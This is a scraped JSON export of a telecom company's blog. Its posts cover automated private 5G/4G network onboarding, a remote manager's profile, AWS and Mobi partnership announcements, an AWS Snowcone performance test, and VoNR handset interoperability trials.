At WG2, we\u2019re offering a rebuilt, modern core network delivered as a hosted service. It drives the dual benefits of cost savings and revenue growth for our private network customers. \\n\\nCase in point: Recently, [we teamed up with Kyocera Mirai Envison](https://www.wgtwo.com/blog/kcme-teams-up-with-wg2-for-private-networks/) to deliver private networks in Japan, and we\u2019re now deploying our first solution in the agricultural sector (link https://www.wgtwo.com/blog/kcme-teams-up-with-wg2-for-private-networks/). \\n\\n**In this post, we\u2019ll explore how it would be possible to rationalize costs and reduce the time to onboard a new customer.**\\n\\n## What you need\\n\\nTo build a private network yourself, you essentially need: \\n* Cellular-related spectrum. You either need a faraday cage or live in a country that allows some cellular-allocated spectrum to be used (i.e. USA with CBRS, Japan with sXGP, Norway with a license, Germany/Spain with a license from the local regulator - the list is growing every day).\\n* RAN equipment - this could be as small as a wifi-sized eNodeB from some vendors to actual macro-like equipment. This equipment will need to be installed. This is the only network hardware you will need, and eventually some compute capabilities if your connectivity needs it (like fast 5G speed are important).\\n* IP addresses - bring your own RFC 1918 addresses, like ChatGPT is recommending. \\n* SIM cards and some phones (that\u2019s probably what ChatGPT refers to as networking equipment). \\n* Network protocols: here, ChatGPT is modest, but you probably want to support protocols: \\n- Some IPSec to connect and secure your RAN equipment back to the core network by protecting the network traffic\\n- Some SCTP traffic to actually enable your RAN equipment to communicate with the core \\n- Some GTP traffic to actually transport your Internet traffic from and to your RAN equipment. \\n* Network hardware and software, and some configuration and administration: this is where WG2 is focusing these days to bring value.  [After testing out](https://www.wgtwo.com/blog/exploring-aws-snowcone/) AWS\u2019s fantastic, little on-premises hardware, the AWS Snowcone, we wanted to enable our customers to enjoy a nearly zero-touch network hardware and software experience.\\n\\n\\nBy analyzing the requirements of a few variants of network RAN equipment, in our lab experience we came up with the following:\\n* Each private network customer might bring their own IP / network CIDR requirement\\n* Each network needs a public endpoint to connect back to our Core \\n* Each network needs some security and configuration knob to be adjusted (i.e. Network identifier or PLMN, Tracking area covered, slice (in case of 5G). \\n\\nEventually, the customer can opt for a packet gateway in the cloud (ideal for voice services) or on premises (ideal for high speed 5G data)\\n\\nIn order to rationalize costs and reduce the time to onboard each customer, we decided to work on automating those minimal deployments, using automation on our clusters running in AWS. This way, our customers will be able to discover our technology at a lower cost and eventually, all by themselves. \\n\\n## The approach\\n\\nThe actual approach is the following:\\n* A manifest for a private network is created - it contains mostly the parameters needed for the network to operate. We focus mostly on the one that the customer will be requesting - i.e. network details (CIDR), network PLMN, tac, etc. These manifests can be created via various means, but a web page and a form can be used. \\n* nThe automaton generates the following elements from the manifest:\\n* A public endpoint (set of IP addresses) that the customer need to input as IPSec configuration \\n* A set of certificates to authenticate the IPSec link with our core \\n* A internal, customer specific, MME/AMF IP configuration (set of IP addresses)\\n* A set of VPN credentials and commands to onboard an edge based virtual machine or bare metal equipment. \\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"middle\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Architecture\\"\\n  src={require(\\"!file-loader!./architecture.png\\").default}\\n  />\\n\\nAt the end of the automation, within seconds, we obtain those elements and we make them available to the customer. \\n\\n**As a result:**\\n* A set of configuration parameters automatically generated such as Certificate Authority, public and private key, as well as IP addresses parameters to enter in their equipment. We aim to automate this via protocols like TR.069 in the long run, but we found it convenient to enable a common set of technology (like IPSec + certificate) as a solid base to start with. Once introduced into RAN equipment, they are automatically connected on their private network overlay and can access our MME/AMF SCTP endpoint and start to attach their phones, and eventually pass their phone calls, once, of course, they have declared the SIM card of their phones/tablets in our system. \\n* Eventually, if they deploy an edge system and execute a simple set of commands, we can onboard their edge computer - such as AWS Snowcone! If they deploy a local version of our packet gateway, voila, their traffic will be automatically offloaded at the edge using the IP range they have provided us. It should be that easy.\\n* In the end, if they want to close the network, no problem. We\u2019ll remove the manifests from our system and the resources will get cleaned from our internal and AWS systems. \\n\\n**How realistic is this?** \\nWe are not too far from this - this is the expected and targeted user experience. We plan to work on the user journey to facilitate the onboarding of different kinds of users, but the underlying technology that enables them to connect should be the same and is mostly working for some simple network use cases. We are currently looking at customer feedback and trials in their labs to constantly improve our automation and further reduce the cost of deploying and operating private networks."},{"id":"managing-from-the-middle-of-nowhere","metadata":{"permalink":"/jp/blog/managing-from-the-middle-of-nowhere","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-03-02-managing-from-the-middle-of-nowhere/index.md","source":"@site/../blog/2023-03-02-managing-from-the-middle-of-nowhere/index.md","title":"Managing from the middle of nowhere","description":"Picture a secluded spot deep in a Norwegian fjord.

Based in the little-known village of Vanvik, his unique workplace is a world away from the bustling tech hubs of Silicon Valley, London or even Oslo.\\n\\nHow does he manage a team of engineers from the middle of nowhere? \\n\\n**In his own words:**\\n\\n\u201cManagement and leadership are crucial in a distributed company, and it\'s easy to overlook their importance when things are running smoothly.\u201d\\n\\n\u201cLessons from Covid have shown that we were well-prepared as a distributed company from day one. We could continue to work much the same way as we already did. Covid didn\'t have a significant impact, but we did learn that doing social things, also in an online setting, is important to get people to know each other.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"To Vanvik from space\\"\\n  src={require(\\"!file-loader!./earthtovanvik.gif\\").default}\\n  />\\n\\n\u201cThe pandemic has accelerated the shift towards remote work, and I believe that distributed companies will continue to thrive in the future.\u201d\\n\\n\u201cManaging teams from the middle of nowhere has been a learning experience. I\'ve found that trying to be close day-to-day by listening and following what\'s going on in Slack and standups is crucial.\u201d\\n\\n\u201cHaving regular one-on-ones with my team members every two weeks helps me stay on top of things. I spend half of Thursday and half of Tuesday on this. We use a single slide to guide us on gauging motivation levels, reviewing development goals and discussing things that are going well, and things that aren\'t going well. We put the slide on the screen, so both of us can see it and comment.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"The four seasons of Vanvik\\"\\n  src={require(\\"!file-loader!./vanvik4seasons.png\\").default}\\n  />\\n\\n\u201cThe fact that every team, including the management, is distributed means that everyone is included. Nobody is left outside.\u201d\\n\\n\u201cAs a natural introvert, I\'ve become more comfortable with being an extrovert. I find both talking one on one and to a bigger group a lot easier over video than in person. When we have company settings and I meet everyone, it\'s not a big deal anymore.\u201d\\n\\n\u201cI can\u2019t follow the water cooler chat in the offices, so I\'m not necessarily colored by who talks the most in those settings. This makes me feel like I start meetings and one-on-ones with a cleaner sheet than I would in an office setting.\u201d\\n\\n\u201cI do miss the dopamine I used to get from coding when I could solve problems quickly. Management means that you think and work with a longer-term perspective. My job is to facilitate and try to make people productive, engaged and happy. I\u2019ve found that having a few old farm buildings to maintain makes for some great distracting physical work where I see the result quickly.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Cats living the good cat life\\"\\n  src={require(\\"!file-loader!./catsofvanvik.png\\").default}\\n  />\\n\\n\u201cLiving with only farmers as neighbors I\u2019ve gotten an immense amount of respect for the Norwegian farmer. I get very inspired by the work ethic, year-round planning and all-round skills that goes into keeping a farm running in the Norwegian fjords.\u201d\\n\\n\u201cMy location impacts me in a few ways. Being close to nature and being able to go for a hike summer or winter is a great way for me to recharge and clear my head. On the other hand, traveling anywhere is at least a half-day effort. It\'s a balance, and I\'ve learned to appreciate the pros and cons of my location.\u201d\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"middle\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Cows are friendly, too!\\"\\n  src={require(\\"!file-loader!./cows.gif\\").default}\\n  />"},{"id":"wg2-teams-up-with-aws-strategic-partnership","metadata":{"permalink":"/jp/blog/wg2-teams-up-with-aws-strategic-partnership","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-02-15-aws-sca-announcement/index.md","source":"@site/../blog/2023-02-15-aws-sca-announcement/index.md","title":"Working Group Two announces strategic collaboration with Amazon Web Services","description":"* Working Group Two and AWS collaborate to help telecom customers deploy mobile core in the cloud","date":"2023-02-15T00:00:00.000Z","formattedDate":"February 15, 2023","tags":[{"label":"saas","permalink":"/jp/blog/tags/saas"},{"label":"operators","permalink":"/jp/blog/tags/operators"},{"label":"core","permalink":"/jp/blog/tags/core"},{"label":"cloud","permalink":"/jp/blog/tags/cloud"},{"label":"partners","permalink":"/jp/blog/tags/partners"},{"label":"aws","permalink":"/jp/blog/tags/aws"},{"label":"press release","permalink":"/jp/blog/tags/press-release"}],"readingTime":3.785,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"wg2-teams-up-with-aws-strategic-partnership","title":"Working Group Two announces strategic collaboration with Amazon Web Services","date":"2023-02-15T00:00:00.000Z","tags":["saas","operators","core","cloud","partners","aws","press release"],"authors":["wgtwo"]},"prevItem":{"title":"Managing from the middle of nowhere","permalink":"/jp/blog/managing-from-the-middle-of-nowhere"},"nextItem":{"title":"We\'re teaming up with Kyocera Mirai Envision to build private networks in Japan","permalink":"/jp/blog/kcme-teams-up-with-wg2-for-private-networks"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n* Working Group Two and AWS collaborate to help telecom customers deploy mobile core in the cloud \\n* Working Group Two\u2019s core-as-a-service empowers mobile operators globally to grow their revenues, drive cost savings and achieve platform effects\\n\\n\x3c!--truncate--\x3e\\n\\n**Oslo, Norway \u2013 February 15 2023** \u2013 Working Group Two (WG2) and Amazon Web Services EMEA Sarl (AWS) are strengthening their collaboration by WG2 increasing AWS\u2019s cloud services to supply mobile core solutions as a service to telecoms and enterprise customers. This expands on the value AWS and WG2 deliver to help telecom operators accelerate their adoption and modernization in the cloud as well as enhance their ability to innovate. \\n\\nWG2 offers a modern core network delivered as a hosted service, which can help cost savings for mobile network operators. In substitution of complex and sub-scale core networks, WG2 allows operators to attach their radio networks to a global, common mobile core platform powered by services designed by AWS to be resilient and reliable. Operators are now able to procure, deploy and consume a 4G/5G/IMS core as-a-service, and focus purely on meeting customer demands. \\n\\nWG2\'s cloud-native core lowers the barriers of entry for network deployments by allowing operators to scale with use. Additionally, WG2\u2019s family of products utilizes the programmability of the core network to offer operators a marketplace of products and services they can bring to market without the need of building or integrating every product for each network.\\n\\nLeading operators such as [CK Hutchison\'s CKH IOD](https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud/) (Europe), Telenor\'s Vimla (Sweden), [Mobi](https://www.wgtwo.com/blog/mobi-expansion-with-wg2-aws/) (United States) and Telavox (Norway, Sweden) already rely on WG2 to host and manage their core networks for parts of their business. WG2 is also delivering private networks in collaboration with [Mitsui Knowledge Industry](https://www.wgtwo.com/blog/mitsui-knowledge-industry-mki-private-networks-business/) and [Kyocera Mirai Envision](https://www.wgtwo.com/blog/kcme-teams-up-with-wg2-for-private-networks/) in Japan. \\n\\nWG2 has spent the last seven years developing one of the world\u2019s first cloud-native programmable multi-tenant mobile core platforms. This provides all the key telecom core features needed for a full-service core, serving everything from smartphones in public networks to Internet of Things (IoT) devices in private networks. AWS and WG2 will collaborate on evolving WG2\u2019s control plane and user plane by leveraging AWS technologies. WG2 and AWS expect this collaboration to be beneficial for telco and enterprise customers that have an interest in modernizing their legacy platforms to cloud-native services and deploying mobile core solutions. \\n\\nAWS\u2019s Telco Director for EMEA, Fabio Cerone, commenting on WG2\u2019s collaboration, said:\\n> \u201cAlready telcos leveraging Working Group Two\u2019s cloud-native mobile core are gaining benefits of greater agility and faster time-to-market.  With the added support for IoT, Mobile Virtual Network Operators and Mobile Private Network use cases within the same platform, together AWS and WG2 will help telcos deliver even more value and services to their customers.\u201d\\n\\nWG2 CEO, Erlend Prestgard, said: \\n> \u201cThe growth we have been part of is now strengthened by our strategic collaboration with AWS, in order to scale and deliver more customer value than before. More companies are starting to see the real benefits of cloud, which has been long heralded as a catalyst for innovation and digital transformation, thanks to its ability to increase development speed and provide near-limitless scale. We are bringing the deep expertise of WG2 and AWS\u2019s powerful cloud services closer to our customers.\u201d\\n\\nMobi CEO, Justen Burdette, said:\\n> \\"We have set out to challenge the status quo in the wireless industry, and the strong relationship with WG2 has been instrumental in our ability to grow from \u2018just\u2019 a small regional wireless provider into a carrier that\u2019s able to do truly disruptive things \u2014 things that typically would take years and exponentially more capital investment.  Thanks to the capabilities we are able to tap into together, we are able to build a seamless, digital, app-first customer experience by leveraging the scalable, secure, and future-proof WG2 mobile core network, powered by AWS.

[Mobi](https://www.mobi.com) is one of only four full mobile virtual network operators (MVNOs) in the United States, where they will leverage America\u2019s leading 5G network, with no territorial restrictions. A pilot solution goes live today.\\n\\nTo support a cost-effective, scalable and innovation-friendly expansion strategy, Mobi partnered with Working Group Two (WG2) to move its core network to the cloud. The WG2 mobile core runs cloud-natively on Amazon Web Services [(AWS)](https://aws.amazon.com/telecom/) and empowers Mobi to build a compelling, app-first customer experience on the largest 5G nationwide network. \\n\\nBy choosing a scalable and flexible cloud architecture, Mobi can offer more competitive rates and faster time-to-market with new services. The Network-as-a-Service approach reduces the time it takes to develop and deploy new features and upgrades. In contrast to legacy solutions, which include only a few network updates per year, Mobi will benefit from continuous, daily upgrades. Further, with a mobile core from WG2 that is agnostic to any generation of wireless, Mobi can future-proof its network with no end-of-life and continuous maintenance and support. \\n\\nWith a programmable, cloud-native core, Mobi will gain unprecedented flexibility, and will realize significantly faster time-to-market with new services.  Once the WG2 mobile core is integrated with the radio network, Mobi can leverage simple APIs to determine which services to activate for every SIM or user. The network is delivered fully as-a-service and the cost is based on consumption, defined by the number and type of users/SIM cards, changing as needs and traffic fluctuate. This allows for lower barriers of entry, and a core network that can scale from single users to hundreds of millions of users.\\n\\nSaid Justen Burdette, CEO of Mobi:\\n> \u201cOur ambition is to disrupt and challenge the status quo in the wireless industry by delivering a seamless, app-first, and engaging customer experience. By working with WG2 and AWS, we not only get access to a scalable, secure, and future-proof core network, we also improve our ability to meet the demands of our customers. It\u2019s all about making it simple to join, affordable to use, and fun to explore what our network can offer. We\u2019re building a brand that resonates with our customers by working with a strong ecosystem of partners.\\"\\n\\nSaid Erlend Prestgard, CEO of WG2:\\n> \u201cMobi is a standout example of a carrier that\u2019s ready to unlock the benefits of a network-as-a-service, achievable with a consistent, programmable mobile core running on the cloud. This allows them to go live in new geographical markets in record time. The simplicity of the as-a-service operating model means that Mobi can focus on meeting customer expectations and spend their time dreaming about innovation, rather than managing complexity. We\u2019re truly excited about joining Mobi on this journey.\\" \\n\\nSaid Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS:\\n> \u201cEmbracing the cloud helps carriers simplify network operations, deploy networks more rapidly, scale more easily - while still retaining full control over the network and gaining additional agility and innovation capabilities. Now the core network is only one API away from the global community of developers, which can help deliver new value for Mobi\u2019s customers.\\"\\n\\nAs an app-first company, wholly focused on user experience, Mobi embraces an open, API-enabled core network approach. Access to WG2\'s global ecosystem of developers offers Mobi a selection of pre-integrated, ready-to-deploy applications for voice, messaging and data services, built by WG2\u2019s development partners from all over the world. Following the continental U.S. rollout, Mobi also plans to leverage the same model to expand to markets including Canada, Puerto Rico and the U.S. Virgin Islands.\\n\\n**About Mobi**  \\nMobi, Inc. launched as the regional wireless provider for Hawai\u02bbi in 2005 \u2014 becoming the first carrier in the United States to offer affordable, simple, unlimited mobile service at a time when activation, overage, and hidden fees were the norm.

We wanted to evaluate the performance of the \\nSnowcone as it is a quite intriguing piece of technology which we might want to use as a an on-premise UPF (User Plane \\nFunction) in low-throughput 5G networks (think IoT or Proof of Concept deployments).\\n\\n\x3c!--truncate--\x3e\\n\\nSpecs:\\n```\\nDimensions: 227 mm x 148.6 mm x 82.65 mm\\nWeight: 2,1 kg\\nvCPU(usable): 2\\nMemory(usable): 4GB\\nStorage(SSD): 14TB\\nNetwork: 2x10GB RJ45\\nDisplay: e-Ink for displaying shipping label or status\\nPower: 65W USB-C (not included)\\n```\\n\\n## Initial Setup\\n\\nOnce receiving the Snowcone it still displays the shipping label on the top of the unit. The IO Ports are hidden behind \\na flap at the back of the unit and the power switch including two LEDs are at the front of the unit.\\n\\nUpon powering it on, the Display will show the IP address of the Snowcone along with a message that the device is Locked\\nand needs to be unlocked using the AWS OpsHub Software which is available for Windows, OSx and Linux (AppImage).\\n\\n<img\\nwidth=\\"100%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Start.png\\").default}\\n/>\\n\\nIn our case we wanted to use a local device, so we selected this option\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Signin.png\\").default}\\n/>\\n\\nNext up was selecting a Snowcone Device followed by the following login screen\\n\\n<img\\nwidth=\\"60%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./Opshub_Signin_configure.png\\").default}\\n/>\\n\\nAt this point you have to login to your AWS Console and navigate to the \u201cSnow Family\u201d Service where you should see \\na so-called JobID for a Snowcone.

It did take a few more minutes though until it downloaded the AMI images \\nthat will run on the Snowcone.\\n\\n## Compute\\n\\nSince the Snowcone is very limited in resources, there are special Instance types for it:\\n- snc1.micro (1 vCPU, 1 GB RAM)\\n- snc1.small (1 vCPU, 2 GB RAM)\\n- snc1.medium (2 vCPU, 4GB RAM)\\n\\nAlso there are only two AMIs available for it now. However it is possible to import EBS Snapshots onto the Snowcone, \\nwhich we have not done as the procedure was too long and we could do with the AMIs provided.\\n\\n<img\\nwidth=\\"60%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Launch_Instance.png\\").default}\\n/>\\n\\n## Instance\\n\\nSince our use case was to run a UPF on it, we started the largest instance type the Snowcone would allow us and \\nstarted exploring.\\n\\nSince the available AMI is an Amazon Linux 2 AMI we were not super familiar with it. However, since it is Red Hat-based \\nwe kind of knew what to expect.\\n\\nThe kernel coming with that AMI was a 4.14 kernel, which was too old for us, so the first thing was updating to \\na 5.15 kernel. We followed this [guide](https://aws.amazon.com/premiumsupport/knowledge-center/amazon-linux-2-kernel-upgrade/) \\nfirst kind of sluggish and noticed that it\'s not a good idea to skip instructions, thereby bricking our instance. \\nWhich made us find out that there are no logs of the boot process or a webshell, like we are used to from EC2.\\n\\nSecond time\'s the charm though and we did have a working instance with a 5.15 kernel. Interestingly enough the \\ndevice key for SSH changed when upgrading from 4.14 to 5.4, but that was only a minor nuisance.\\nSo we thought let\'s do some exploring what we actually have here.\\n\\n<img\\nwidth=\\"60%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./Instance_lspci.png\\").default}\\n/>\\n\\nThere was not too much information here. So let\'s have a look at the CPU Information.\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./lscpu.png\\").default}\\n/>\\n\\nSo a CPU from the Xeon E3-12xx v2 line. Even though this might be the virtualization engine telling us that this is \\nthe CPU, we are assuming that it will be something from the Ivy Bridge line. Furthermore we are assuming that it will \\nbe a low-powered 4 Core CPU working there, where only 2 CPUs are available for the consumer.\\n\\nAfter digging a bit through dmidecode (we are engineers right?) we also found this additional piece of information\\n\\n<img\\nwidth=\\"70%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./dmidecode.png\\").default}\\n/>\\n\\nThe interesting part here is that the Manufacturer is designated as Bochs, which is a x86 and AMD64 emulator. \\nSo maybe it\'s not a virtualization engine driving the Instance, but an emulator?\\n\\nBut now back to our original plan to run a UPF (User Plane Function for 5G) on the Snowcone. For this to work we \\nneeded 2 network interfaces as our original plan was to use DPDK to run it. This is where we quickly found out that \\nan Instance on Snowcone can only have 1 Virtual Network Interface (VNI).\\n\\nAfter scouring through the documentation about Snowcone, we however found out that first of all there is another way \\nto configure the Snowcone. You can also configure the Snowcone with a CLI, the [SnowballEdgeClient](https://aws.amazon.com/snowball/resources/).\\n\\nIn there we found a different type of network Interface, the so called Direct Network Interface (DNI), and according \\nto documentation, the Snowcone supports up to 63 DNIs attached to it.\\nSo we created a DNI and attached it to our instance.\\nTo our surprise it showed up as an Intel X553 Virtual Network Function(VNF), so this is basically \\nSingle-Root IO-Virtualization (SRIOV) at work here. Which also makes sense because the X500 series supports up \\nto 64 VNFs (minus the one used by the snowcone itself).\\n\\nSo we started deploying our DPDK-based UPF on the snowcone. Creating a DNI and attaching it to an instance was fairly \\neasy with the SnowballEdgeClient. However, when restarting the instance, it would not come back. \\nAfter talking to AWS we were informed that this is a bug that is related with the interface naming and \\nshould be fixed in a future release.\\n\\nFor the meantime it can be circumvented by switching to [Predictable Network Interface Names](https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/).\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./change_to_predictable_NIC_Names.png\\").default}\\n/>\\n\\nOnce the DNI is attached to the instance, one has to do some additional configuration on the instance for both \\nthe VNI and DNI to get IP addresses. We found the relevant [guide](https://docs.aws.amazon.com/snowball/latest/developer-guide/network-config-ec2.html) \\nin the AWS Documentation and our DNI got an IP Address.\\n\\nWith those parts out of the way, we could deploy our DPDK-based UPF on the Snowcone and could use it as a UPF.\\n\\n## Performance\\n\\nEvaluating the performance of the Snowcone device was actually what triggered this whole exploration. So let\'s look mainly at the networking performance and also slightly at the cpu performance.\\n\\nFor this we are mainly using iperf3 to evaluate the throughput. The Snowcone as well as our test machine here in the lab have a Intel X55x 10Gbit NIC.\\n\\nWhen the Snowcone snc1.medium instance is the iperf Server:\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./iperf-server.png\\").default}\\n/>\\n\\nWhen the Snowcone snc1.medium instance is the iperf Client:\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./iperf-client.png\\").default}\\n/>\\n\\nFrom these very simple benchmarks we can already see that the EC2 instance is struggling with pushing out anywhere \\nnear line speed. In other words it seems like it is CPU bottlenecked. When running a htop while running this speedtest \\ndoes confirm that one of the CPUs hits 100% utilization every now and then. This makes sense because iperf3 is \\nsingle-threaded by design.\\n\\nWe then did run a speedtest to a local speedtest server using our userland UPF from a UE and this is basically \\nthe result.\\n\\n<img\\nwidth=\\"50%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./userland-speedtest.png\\").default}\\n/>\\n\\nLooking at htop again, we can see that now both CPU cores are pegged at 100% since the UPF is actually multithreaded. \\nSo even if the EC2 instance in Snowcone can push about 6 Gbit/s on iperf3, with the additional overhead of \\nGTP encapsulation and de-encapsulation, it can only do about 180 Mbit/s.\\n\\nWe know that our userland UPF will be able to push around 500 Mbit/s on other machines, so this is a clear limitation \\nof the Snowcone.\\n\\nWith the DPDK based UPF however we are able to have higher throughput. DPDK will take control over the DNI and use \\na poll-mode driver for packet processing. So one CPU core will always be pinned at 100% and the NIC will \\ndisappear from the instance.\\n\\n<img\\nwidth=\\"50%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./vpp-speedtest.png\\").default}\\n/>\\n\\nThis is actually the maximum speed we can get out of our gNodeB. So we are pretty happy with the result.\\n\\nWe hope you liked this short look at the AWS Snowcone, and we will for sure explore the Snowcone further.

To be clear, we\u2019re not talking about making a \u201cfirst\u201d Voice over New Radio (VoNR) call (those took place way back in 2021), but about making VoNR calls from a set of major commercial off-the-shelf (COTS) 5G devices to other mobile and fixed handsets. \\n\\n\x3c!--truncate--\x3e\\n\\nAs we see it, voice continues to be relevant across \u201cGs\u201d, usage areas, and handset types. This year, we\u2019ve continued to rapidly adapt our voice stack to emerging needs. This included enabling it for 5G Standalone (SA; also called New Radio, or NR). We\u2019re doing this because we see strong effects of taking a platform approach, where adding something like VoNR becomes a relatively straightforward exercise. \\n\\nLet\u2019s put some emphasis on \u201crelatively\u201d because there are some thoughtful considerations to be made and some steps to be taken. In a pure 5G world, you\u2019ll have a fancy new radio with high bandwidth, low latency, and the opportunity to create little (or big) slices for various use cases. In addition to the radio, you\u2019ll have a new 5G SA core where all this beauty is enabled and managed. \\n\\nThe situation right now is that even if you have a \u201c5G\u201d logo on the top of your handset, you are - in most commercial 5G networks - actually calling via 4G. This means that your handset needs to connect to a 4G core and an IP Multimedia Subsystem (IMS) core to act as the intermediary between you and the person you want to talk to. 4G radio network coverage is significantly better in most parts of the world and pretty much all handsets out there support that \u201cG\u201d. \\n\\nWhat we want is to enable a pure 5G play, that is, a 5G handset making 5G calls using exclusively a 5G stack all the way. This reduces complexity, improves reliability of calls by avoiding radio access technology changes, and enables effective use of network and handset resources (control plane and airtime). This is especially valuable in a private network or other greenfield environments. Most brownfield deployments have been designed to basically use the current network technology to support voice usage. \\n\\n> For example, during early 4G deployments, 3G voice was used, delaying the actual deployment of VoLTE (4G) technology. Similarly, 5G Non-Standalone (NSA) is still using a 4G anchor to support voice calls. In a pure, greenfield deployment, such as with CBRS or sXGP spectrum types, where customers will most likely deploy a single G (either 4G for cost/maturity driven reasons, or 5G for bandwidth per cell or future-proof reasons), voice will need to be supported from day one. \\n\\n## Here\u2019s what we did\\n\\n **1.** We first got a hold of a set of COTS handsets featuring the major mobile handset chipsets in the market, from the likes of MediaTek, Samsung, Qualcomm and Huawei.\\n \\n **2.** Then we connected our cloud-based IMS core to our 5G SA core. \\n \\n **3.** We connected our core to a commercial 5G antenna in our lab. The 5G antenna was procured from one of the major mobile network vendors. Interestingly, it didn\u2019t support VoNR out of the box, so we had to enable that setting. \\n \\n **4.** We then started testing the handsets (and their chipsets). We observed that they have different levels of maturity in their stacks. For example, we discovered that some handsets were unstable if they did not have access to the IMS core. \\n \\n > A further explanation on that: a user equipment (UE), according to the 3GPP specs,  has a voice or data-centric setting they employ when registering on the network. For an UE with a voice-centric function, like handsets, most of them will try to connect to an IMS core. If a PDU session establishment request is not honored by the core, the handset will disconnect and reconnect, creating some fluctuations on the data connection. The only way to ensure those handsets got a proper data connection was to secure a connection to the IMS core. \\n \\n **5.** Ultimately, we were able to establish voice calls in all directions - to 5G, 4G handsets (VoLTE), VoWifi and so on. \\n \\n## Let\'s dig a little deeper\\n5G handsets place voice calls by initiating a connection to the 5G network\u2019s IMS core. Handsets would disconnect or underperform if they couldn\u2019t establish that connection. The 5G core needs to implement an establishment and release of dedicated Quality of Service (QoS) flows. These flows tell the UE and antenna how to prioritize IP packets carrying call audio over other mobile data traffic. \\n\\nMore specifically, a QoS flow is associated with standardized 5G QoS identifiers (5QI) that among other things define packet error rate and delay budget, and whether IP packets associated with the flow get a guaranteed bit rate. Only when a dedicated QoS flow for voice is established, the scheduler of the antenna as well as the rest of the involved 5G core elements have all the ingredients to prioritize a phone call over, say, a Netflix session in the background. \\n\\nThe COTS handsets we tested behaved differently in how they handled the establishment of an IMS connection and QoS flow. That leads us to conclude that even in the 5G SA networks there are still some major interoperability challenges, including on the antenna side, which might be configured for data primarily, not voice. \\n\\nNevertheless, 5G SA has reached a state where its technology can be procured and used with handsets available in the market."},{"id":"hackoween-october-2022","metadata":{"permalink":"/jp/blog/hackoween-october-2022","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-10-31-hackoween/index.md","source":"@site/../blog/2022-10-31-hackoween/index.md","title":"Here\'s what happened at Hackoween \ud83c\udf83","description":"Just as October was about to close, we ran a hackathon, aptly named \\"Hackoween\\" \ud83c\udf83","date":"2022-11-03T00:00:00.000Z","formattedDate":"November 3, 2022","tags":[{"label":"hackathon","permalink":"/jp/blog/tags/hackathon"}],"readingTime":2.32,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"hackoween-october-2022","title":"Here\'s what happened at Hackoween \ud83c\udf83","date":"2022-11-03T00:00:00.000Z","tags":["hackathon"],"authors":"wgtwo","image":"./Hackoween.png"},"prevItem":{"title":"We have just completed our first VoNR (5G) calls in a multi-handset environment","permalink":"/jp/blog/first-voice-calls-on-5g"},"nextItem":{"title":"Our guide to internal phishing campaigns","permalink":"/jp/blog/internal-email-phishing-campaigns"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nJust as October was about to close, we ran a hackathon, aptly named \\"Hackoween\\" \ud83c\udf83\\n\\nHackdays are a great way for everyone in the company to work together in creating new innovative solutions for everyday 